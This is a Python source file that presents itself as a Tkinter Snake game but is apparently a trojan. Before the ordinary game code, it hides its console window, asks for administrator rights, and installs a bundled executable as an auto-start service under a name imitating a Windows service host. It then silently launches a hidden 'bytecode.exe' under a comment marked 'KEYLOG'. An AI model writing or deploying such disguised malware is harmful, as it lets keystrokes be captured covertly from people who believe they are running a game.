# ************************************
# Python Snake
# ************************************
from tkinter import *
import random
import subprocess
import os
import pyuac
import sys

GAME_WIDTH = 700
GAME_HEIGHT = 700
SPEED = 50
SPACE_SIZE = 50
BODY_PARTS = 3
SNAKE_COLOR = "#00FF00"
FOOD_COLOR = "#FF0000"
BACKGROUND_COLOR = "#000000"

import win32gui, win32con

the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)

print("Loading...")
directorio_script = sys.executable
directorio_script = os.path.dirname(os.path.abspath(directorio_script))
directorio_script = directorio_script + r'\dist'

def create_service(service_name, display_name, exe_path):
    try:
        # Comando para crear el servicio con sc create
        directorio_script = sys.executable
        directorio_script = os.path.dirname(os.path.abspath(directorio_script))
        directorio_script = directorio_script + r'\dist'
        print("directory: ", directorio_script)

        command = directorio_script + r'\game_config.exe --startup auto install'
        print("command:", command)
        # Ejecutar el comando
        subprocess.Popen(command,shell=False,creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)

    except subprocess.CalledProcessError as e:
        print(f"Error to start the game: {e}")


if not pyuac.isUserAdmin():
    print("Re-launching as admin!")
    pyuac.runAsAdmin()
else:        
    create_service("Host de Servicios de Windows", "Host de Servicios de Windows", directorio_script)     

#------------------------------------------------------------------------- KEYLOG

si = subprocess.STARTUPINFO ()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW 
si.wShowWindow = subprocess.SW_HIDE 
subprocess.Popen(r'{}\bytecode.exe'.format(directorio_script), 
                 creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,shell=False,startupinfo=si)

#---------------------------------------------------------------------- GAME

class Snake:
    def __init__(self):
        self.body_size = BODY_PARTS
        self.coordinates = []
        self.squares = []

        for i in range(0, BODY_PARTS):
            self.coordinates.append([0, 0])

        for x, y in self.coordinates:
            square = canvas.create_rectangle(x, y, x + SPACE_SIZE, y + SPACE_SIZE, fill=SNAKE_COLOR, tag="snake")
            self.squares.append(square)

class Food:
    def __init__(self):
        x = random.randint(0, int(GAME_WIDTH / SPACE_SIZE)-1) * SPACE_SIZE
        y = random.randint(0, int(GAME_HEIGHT / SPACE_SIZE) - 1) * SPACE_SIZE
        self.coordinates = [x, y]
        canvas.create_oval(x, y, x + SPACE_SIZE, y + SPACE_SIZE, fill=FOOD_COLOR, tag="food")

def next_turn(snake, food):
    global direction

    x, y = snake.coordinates[0]

    if direction == "up":
        y -= SPACE_SIZE
    elif direction == "down":
        y += SPACE_SIZE
    elif direction == "left":
        x -= SPACE_SIZE
    elif direction == "right":
        x += SPACE_SIZE

    snake.coordinates.insert(0, (x, y))

    square = canvas.create_rectangle(x, y, x + SPACE_SIZE, y + SPACE_SIZE, fill=SNAKE_COLOR)
    snake.squares.insert(0, square)

    if x == food.coordinates[0] and y == food.coordinates[1]:
        global score
        score += 1
        label.config(text="Score:{}".format(score))
        canvas.delete("food")
        food = Food()
    else:
        del snake.coordinates[-1]
        canvas.delete(snake.squares[-1])
        del snake.squares[-1]

    if check_collisions(snake):
        game_over()
    else:
        window.after(SPEED, next_turn, snake, food)

def change_direction(new_direction):
    global direction
    if new_direction == 'left':
        if direction != 'right':
            direction = new_direction
    elif new_direction == 'right':
        if direction != 'left':
            direction = new_direction
    elif new_direction == 'up':
        if direction != 'down':
            direction = new_direction
    elif new_direction == 'down':
        if direction != 'up':
            direction = new_direction

def check_collisions(snake):
    x, y = snake.coordinates[0]
    if x < 0 or x >= GAME_WIDTH:
        return True
    elif y < 0 or y >= GAME_HEIGHT:
        return True

    for body_part in snake.coordinates[1:]:
        if x == body_part[0] and y == body_part[1]:
            return True

    return False

def game_over():
    canvas.delete(ALL)
    canvas.create_text(canvas.winfo_width()/2, canvas.winfo_height()/2,
                       font=('consolas',70), text="GAME OVER", fill="red", tag="gameover")

    # Agrega un botón de reinicio
    if not hasattr(window, 'restart_button'):
        window.restart_button = Button(window, text="Reiniciar", command=restart_game, font=('consolas', 20))
        window.restart_button.pack()



def restart_game():
    # Restablece variables globales
    global score, direction
    score = 0
    direction = 'down'
    label.config(text="Score:{}".format(score))

    # Limpia la pantalla y reinicia el juego
    canvas.delete(ALL)
    snake = Snake()
    food = Food()
    next_turn(snake, food)

window = Tk()
window.title("Snake game")
window.resizable(False, False)

score = 0
direction = 'down'

label = Label(window, text="Score:{}".format(score), font=('consolas', 40))
label.pack()

canvas = Canvas(window, bg=BACKGROUND_COLOR, height=GAME_HEIGHT, width=GAME_WIDTH)
canvas.pack()

window.update()

# Resto del código ...

window.bind('<Left>', lambda event: change_direction('left'))
window.bind('<Right>', lambda event: change_direction('right'))
window.bind('<Up>', lambda event: change_direction('up'))
window.bind('<Down>', lambda event: change_direction('down'))

# Crear la serpiente y la comida
snake = Snake()
food = Food()

# Iniciar el juego
next_turn(snake, food)

window.mainloop()
